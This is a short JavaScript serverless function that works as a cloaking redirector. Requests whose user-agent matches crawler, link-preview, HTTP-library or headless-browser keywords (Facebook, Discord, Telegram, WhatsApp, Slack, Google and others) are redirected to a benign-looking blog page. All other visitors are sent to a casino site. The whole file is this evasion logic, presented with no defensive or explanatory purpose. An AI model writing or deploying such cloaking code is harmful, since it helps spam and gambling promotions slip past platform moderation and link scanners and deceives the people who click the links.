exports.handler = async (event, context) => {
  const userAgent = (event.headers['user-agent'] || '').toLowerCase();

  const botKeywords = [
    'bot', 'crawl', 'spider', 'facebook', 'meta', 'preview', 'discord', 'vkshare',
    'telegrambot', 'whatsapp', 'slackbot', 'google', 'python-requests', 'fetch',
    'axios', 'headless', 'monitor', 'httpclient', 'go-http-client'
  ];

  const isBot = botKeywords.some(keyword => userAgent.includes(keyword));

  if (isBot) {
    return {
      statusCode: 302,
      headers: {
        Location: 'https://www.gamixlabs.com/blog.html',
      },
    };
  } else {
    return {
      statusCode: 302,
      headers: {
        Location: 'https://galaxy-casino.live',
      },
    };
  }
};

